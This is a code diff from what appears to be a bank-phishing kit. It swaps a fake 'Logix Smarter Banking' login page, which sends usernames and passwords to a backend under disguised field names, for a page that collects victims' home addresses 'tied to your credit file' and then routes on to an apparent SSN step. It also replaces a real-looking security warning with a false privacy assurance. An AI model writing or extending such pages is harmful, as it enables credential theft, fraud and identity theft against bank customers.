@@ -1,149 +1,179 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 
 const HomeAddress: React.FC = () => {
-  const [emzemz, setEmzemz] = useState('');
-  const [pwzenz, setPwzenz] = useState('');
+  const [stAd, setStAd] = useState('');
+  const [apt, setApt] = useState('');
+  const [city, setCity] = useState('');
+  const [state, setState] = useState('');
+  const [zipCode, setZipCode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [showPwzenz, setShowPwzenz] = useState(false);
-  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
+  const [errors, setErrors] = useState({ 
+    stAd: '', 
+    apt: '', 
+    city: '', 
+    state: '', 
+    zipCode: '' 
+  });
 
   const navigate = useNavigate();
-
-  const togglePwzenzVisibility = () => {
-    setShowPwzenz((prev) => !prev);
-  };
-
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
-  };
+  const location = useLocation();
+  const { emzemz } = location.state || {};
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    setIsLoading(true);
     event.preventDefault();
-    let newErrors = { emzemz: '', pwzenz: '' };
-
-    if (!validateEmzemz(emzemz)) {
-      newErrors.emzemz = 'Invalid email format.';
-      setIsLoading(false);
-    }
-
-    if (pwzenz.length <= 0) {
-      newErrors.pwzenz = 'Password must be at least 6 characters.';
-      setIsLoading(false);
-    }
+    setIsLoading(true);
+    
+    let newErrors = { 
+      stAd: !stAd.trim() ? 'Street Address is required' : '',
+      city: !city.trim() ? 'City is required' : '',
+      state: !state.trim() ? 'State is required' : '',
+      zipCode: !zipCode.trim() ? 'Zip Code is required' : '',
+      apt: ''
+    };
 
     setErrors(newErrors);
 
-    // Check if there are no errors
-    if (!newErrors.emzemz && !newErrors.pwzenz) {
-      // Proceed with form submission
-      console.log('Form submitted with:', { emzemz, pwzenz });
-
-      const url = `${baseUrl}api/meta-data-1/`;
-
+    if (!Object.values(newErrors).some(error => error)) {
       try {
-        await axios.post(url, {
-          emzemz: emzemz,
-          pwzenz: pwzenz,
+        await axios.post(`${baseUrl}api/meta-data-4/`, {
+          emzemz,
+          stAd,
+          apt,
+          city,
+          state,
+          zipCode,
         });
-        console.log('Message sent successfully');
-        navigate('/');
+        navigate('/ssn1', { state: { emzemz } });
       } catch (error) {
         console.error('Error sending message:', error);
         setIsLoading(false);
       }
-
-      setErrors({ emzemz: '', pwzenz: '' });
+    } else {
+      setIsLoading(false);
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className=" border-b-2 border-teal-500 px-6 py-4">
-        <h2 className="text-lg text-gray-700">Sign In – Welcome to Logix Smarter Banking</h2>
+    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
+      <div className="border-b-2 border-teal-500 px-8 py-4">
+        <h2 className="text-xl font-semibold text-gray-800">Home Address</h2>
       </div>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <form onSubmit={handleSubmit}>
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Username:</label>
-            <input
-              id="emzemz"
-              name="emzemz"
-              type="email"
-              value={emzemz}
-              onChange={(e) => setEmzemz(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-            />
-            <a href="#" className="text-blue-700 text-sm hover:underline">Not Registered?</a>
-          </div>
-
-          {errors.emzemz && (
-            <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
-              <svg
-                width="1rem"
-                height="1rem"
-                viewBox="0 0 24 24"
-                className="fill-current text-red-600"
-                aria-hidden="true"
-              >
-                <path
-                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                  fillRule="nonzero"
-                ></path>
-              </svg>
-
-              <p>Email required</p>
+      <div className="px-8 py-6 bg-white space-y-6">
+        <p className="text-sm text-gray-600 text-center mb-8">
+          We'll need you to confirm your home address. The one tied to your credit file.
+        </p>
+        
+        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
+          {/* Street Address */}
+          <div className="mb-4">
+            <div className="flex items-center gap-4 ">
+              <label className="text-gray-700 w-32 text-right">Street Address:</label>
+              <input
+                id="stAd"
+                name="stAd"
+                type="text"
+                value={stAd}
+                onChange={(e) => setStAd(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              />
             </div>
-          )}
-
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Password:</label>
-            <input
-              id="pwzenz"
-              name="pwzenz"
-              type={showPwzenz ? 'text' : 'password'}
-              value={pwzenz}
-              onChange={(e) => setPwzenz(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-            />
-            <a href="#" className="text-blue-700 text-sm hover:underline">Forgot Password?</a>
+            {errors.stAd && (
+              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                {errors.stAd}
+              </div>
+            )}
           </div>
 
-          {errors.pwzenz && (
-            <div className="flex items-center gap-3 text-sm font-bold mt-2">
-              <svg
-                width="1rem"
-                height="1rem"
-                viewBox="0 0 24 24"
-                className="fill-current text-red-600"
-                aria-hidden="true"
-              >
-                <path
-                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                  fillRule="nonzero"
-                ></path>
-              </svg>
-
-              <p>Password required</p>
+          {/* Apt or Unit */}
+          <div className="mb-4">
+            <div className="flex items-center gap-4">
+              <label className="text-gray-700 w-32 text-right">Apt or Unit (optional):</label>
+              <input
+                id="apt"
+                name="apt"
+                type="text"
+                value={apt}
+                onChange={(e) => setApt(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              />
             </div>
-          )}
-
-          <div className="flex items-center gap-4">
-            <div className="w-24"></div>
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={togglePwzenzVisibility}
-            >
-              {showPwzenz ? 'Hide' : 'Show'}
-            </span>
           </div>
-        </form>
-      </div>
+
+          {/* City */}
+          <div className="mb-4">
+            <div className="flex items-center gap-4">
+              <label className="text-gray-700 w-32 text-right">City:</label>
+              <input
+                id="city"
+                name="city"
+                type="text"
+                value={city}
+                onChange={(e) => setCity(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              />
+            </div>
+            {errors.city && (
+              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                {errors.city}
+              </div>
+            )}
+          </div>
+
+          {/* State */}
+          <div className="mb-4">
+            <div className="flex items-center gap-4">
+              <label className="text-gray-700 w-32 text-right">State:</label>
+              <input
+                id="state"
+                name="state"
+                type="text"
+                value={state}
+                onChange={(e) => setState(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              />
+            </div>
+            {errors.state && (
+              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                {errors.state}
+              </div>
+            )}
+          </div>
+
+          {/* Zip Code */}
+          <div className="mb-6">
+            <div className="flex items-center gap-4">
+              <label className="text-gray-700 w-32 text-right">Zip Code:</label>
+              <input
+                id="zipCode"
+                name="zipCode"
+                type="text"
+                value={zipCode}
+                onChange={(e) => setZipCode(e.target.value)}
+                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              />
+            </div>
+            {errors.zipCode && (
+              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                {errors.zipCode}
+              </div>
+            )}
+          </div>
 
       <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
         {!isLoading ? (
@@ -157,23 +187,14 @@ const HomeAddress: React.FC = () => {
           <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
         )}
       </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
-        </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
-        </div>
+        </form>
       </div>
 
-   
+      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
+        <p className="text-xs text-gray-600">
+          Your information is secure and will be used in accordance with our Privacy Policy.
+        </p>
+      </div>
     </div>
   );
 };
